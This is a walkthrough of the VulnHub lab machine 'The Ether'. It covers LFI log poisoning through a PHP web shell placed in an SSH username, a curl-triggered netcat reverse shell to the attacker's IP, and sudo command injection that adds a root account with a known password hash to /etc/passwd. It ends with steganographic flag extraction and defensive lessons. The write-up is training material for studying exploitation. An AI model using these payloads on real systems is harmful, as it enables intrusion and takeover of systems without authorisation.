# The Ether: Walkthrough

## Overview
**Machine Name**: The Ether
**Platform**: VulnHub
**Difficulty**: Medium
**OS**: Linux (Ubuntu)
**Focus**: LFI Log Poisoning, SSH Payload Execution, Sudo Script Command Injection, Steganographic Flag Extraction

## Enumeration
### Network Discovery
An ARP sweep discovered the target machine IP address: `192.168.29.40`.
![](screenshots/Pasted%20image%2020260426203349.png)

### Port Scanning
A port scan was launched to discover open ports:
```bash
nmap -T4 -A -p- 192.168.29.40
```
Open ports:
| Port | Service | Version |
| --- | --- | --- |
| 22/tcp | ssh | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 80/tcp | http | Apache httpd 2.4.18 (Ubuntu) |

### Web & LFI Enumeration
Directory fuzzing on port 80 using `ffuf` discovered `/images` and `/layout` directories.
![](screenshots/Pasted%20image%2020260426203554.png)

Navigating the site revealed a parameter that was vulnerable to Local File Inclusion (LFI):
`http://192.168.29.40/index.php?file=research.php`
![](screenshots/Pasted%20image%2020260503195442.png)

Using the LFI vulnerability, the system logs were successfully read:
`http://192.168.29.40/index.php?file=/var/log/auth.log`
![](screenshots/Pasted%20image%2020260503195549.png)

## Exploitation
### LFI Log Poisoning
Since `/var/log/auth.log` was readable via LFI, an SSH log poisoning attack was executed. A command payload was sent via the SSH username:
```bash
ssh '<?php system($_GET['cmd']);?>'@192.168.29.40
```

Triggering the payload via the LFI page using curl spawned a reverse shell:
```bash
curl -is 'http://192.168.29.40/index.php?file=/var/log/auth.log&cmd=mknod%20/tmp/backpipe%20p;%20/bin/sh%200</tmp/backpipe%20|%20nc%20192.168.29.199%20443%201>/tmp/backpipe'
```
```bash
whoami
www-data
```

## Privilege Escalation
### Local Sudo Enumeration
A TTY shell was spawned using Python, and sudo privileges were checked:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
sudo -l
```
The output showed that `www-data` can run a python script `/var/www/html/theEther.com/public_html/xxxlogauditorxxx.py` as `root` without a password.

### Command Injection
Running the script showed it asks to load a log file:
```
Load which log?: 
```
Since the script processes the file path directly in a system shell command, a command injection attack was executed using a pipe character:
```bash
Load which log?: /var/log/auth.log| echo 'newroot1:Fwf4WAu/u5ulw:0:0::/root:/bin/bash' >> /etc/passwd
```
The password hash `Fwf4WAu/u5ulw` corresponds to `123456`.

### Root Access
Logging in as the new root user:
```bash
su newroot1
Password: 123456
whoami
root
```

## Post-Exploitation
### Flag Recovery
In `/root`, a file named `flag.png` was found. A python HTTP server was hosted to download the image file:
```bash
python3 -m http.server 8080
```

Analyzing the file metadata and contents on the attacker host:
```bash
exiftool flag.png
strings flag.png | tail
```
This revealed a base64 encoded flag string appended after the PNG `IEND` chunk:
```
flag: b2N0b2JlciAxLCAyMDE3LgpXZSBoYXZlIG9yIGZpcnN0IGJhdGNoIG9mIHZvbHVudGVlcnMgZm9yIHRoZSBnZW5vbWUgcHJvamVjdC4gVGhlIGdyb3VwIGxvb2tzIHByb21pc2luZywgd2UgaGF2ZSBoaWdoIGhvcGVzIGZvciB0aGlzIQoKT2N0b2JlciAzLCAyMDE3LgpUaGUgZmlyc3QgaHVtYW4gdGVzdCB3YXMgY29uZHVjdGVkLiBPdXIgc3VyZ2VvbnMgaGF2ZSBpbmplY3RlZCBhIGZlbWFsZSBzdWJqZWN0IHdpdGggdGhlIGZpcnN0IHN0cmFpbiBvZiBhIGJlbmlnbiB2aXJ1cy4gTm8gcmVhY3Rpb25zIGF0IHRoaXMgdGltZSBmcm9tIHRoaXMgcGF0aWVudC4KCk9jdG9iZXIgMywgMjAxNy4KU29tZXRoaW5nIGhhcyBnb25lIHdyb25nLiBBZnRlciBhIGZldyBob3VycyBvZiBpbmplY3Rpb24sIHRoZSBodW1hbiBzcGVjaW1lbiBhcHBlYXJzIHN5bXB0b21hdGljLCBleGhpYml0aW5nIGRlbWVudGlhLCBoYWxsdWNpbmF0aW9ucywgc3dlYXRpbmcsIGZvYW1pbmcgb2YgdGhlIG1vdXRoLCBhbmQgcmFwaWQgZ3Jvd3RoIG9mIGNhbmluZSB0ZWV0aCBhbmQgbmFpbHMuCgpPY3RvYmVyIDQsIDIwMTcuCk9ic2VydmluZyBvdGhlciBjYW5kaWRhdGVzIHJlYWN0IHRvIHRoZSBpbmplY3Rpb25zLiBUaGUgZXRoZXIgc2VlbXMgdG8gd29yayBmb3Igc29tZSBidXQgbm90IGZvciBvdGhlcnMuIEtlZXBpbmcgY2xvc2Ugb2JzZXJ2YXRpb24gb24gZmVtYWxlIHNwZWNpbWVuIG9uIE9jdG9iZXIgM3JkLgoKT2N0b2JlciA3LCAyMDE3LgpUaGUgZmlyc3QgZmxhdGxpbmUgb2YgdGhlIHNlcmllcyBvY2N1cnJlZC4gVGhlIGZlbWFsZSBzdWJqZWN0IHBhc3NlZC4gQWZ0ZXIgZGVjcmVhc2luZywgbXVzY2xlIGNvbnRyYWN0aW9ucyBhbmQgbGlmZS1saWtlIGJlaGF2aW9ycyBhcmUgc3RpbGwgdmlzaWJsZS4gVGhpcyBpcyBpbXBvc3NpYmxlISBTcGVjaW1lbiBoYXMgYmVlbiBtb3ZlZCB0byBhIGNvbnRhaW5tZW50IHF1YXJhbnRpbmUgZm9yIGZ1cnRoZXIgZXZhbHVhdGlvbi4KCk9jdG9iZXIgOCwgMjAxNy4KT3RoZXIgY2FuZGlkYXRlcyBhcmUgYmVnaW5uaW5nIHRvIGV4aGliaXQgc2ltaWxhciBzeW1wdG9tcyBhbmQgcGF0dGVybnMgYXMgZmVtYWxlIHNwZWNpbWVuLiBQbGFubmluZyB0byBtb3ZlIHRoZW0gdG8gcXVhcmFudGluZSBhcyB3ZWxsLgoKT2N0b2JlciAxMCwgMjAxNy4KSXNvbGF0ZWQgYW5kIGV4cG9zZWQgc3ViamVjdCBhcmUgZGVhZCwgY29sZCwgbW92aW5nLCBnbmFybGluZywgYW5kIGF0dHJhY3RlZCB0byBmbGVzaCBhbmQvb3IgYmxvb2QuIENhbm5pYmFsaXN0aWMtbGlrZSBiZWhhdmlvdXIgZGV0ZWN0ZWQuIEFuIGFudGlkb3RlL3ZhY2NpbmUgaGFzIGJlZW4gcHJvcG9zZWQuCgpPY3RvYmVyIDExLCAyMDE3LgpIdW5kcmVkcyBvZiBwZW9wbGUgaGF2ZSBiZWVuIGJ1cm5lZCBhbmQgYnVyaWVkIGR1ZSB0byB0aGUgc2lkZSBlZmZlY3RzIG9mIHRoZSBldGhlci4gVGhlIGJ1aWxkaW5nIHdpbGwgYmUgYnVybmVkIGFsb25nIHdpdGggdGhlIGV4cGVyaW1lbnRzIGNvbmR1Y3RlZCB0byBjb3ZlciB1cCB0aGUgc3RvcnkuCgpPY3RvYmVyIDEzLCAyMDE3LgpXZSBoYXZlIGRlY2lkZWQgdG8gc3RvcCBjb25kdWN0aW5nIHRoZXNlIGV4cGVyaW1lbnRzIGR1ZSB0byB0aGUgbGFjayBvZiBhbnRpZG90ZSBvciBldGhlci4gVGhlIG1haW4gcmVhc29uIGJlaW5nIHRoZSBudW1lcm91cyBkZWF0aCBkdWUgdG8gdGhlIHN1YmplY3RzIGRpc3BsYXlpbmcgZXh0cmVtZSByZWFjdGlvbnMgdGhlIHRoZSBlbmdpbmVlcmVkIHZpcnVzLiBObyBwdWJsaWMgYW5ub3VuY2VtZW50IGhhcyBiZWVuIGRlY2xhcmVkLiBUaGUgQ0RDIGhhcyBiZWVuIHN1c3BpY2lvdXMgb2Ygb3VyIHRlc3RpbmdzIGFuZCBhcmUgY29uc2lkZXJpbmcgbWFydGlhbCBsYXdzIGluIHRoZSBldmVudCBvZiBhbiBvdXRicmVhayB0byB0aGUgZ2VuZXJhbCBwb3B1bGF0aW9uLgoKLS1Eb2N1bWVudCBzY2hlZHVsZWQgdG8gYmUgc2hyZWRkZWQgb24gT2N0b2JlciAxNXRoIGFmdGVyIFBTQS4=
```

## Lessons Learned
1. Never pass unsanitized user arguments directly to command execution wrappers (like `system` or `subprocess` commands inside python scripts).
2. Protect PHP configurations against LFI by disabling `allow_url_include` and restricting log file permissions.
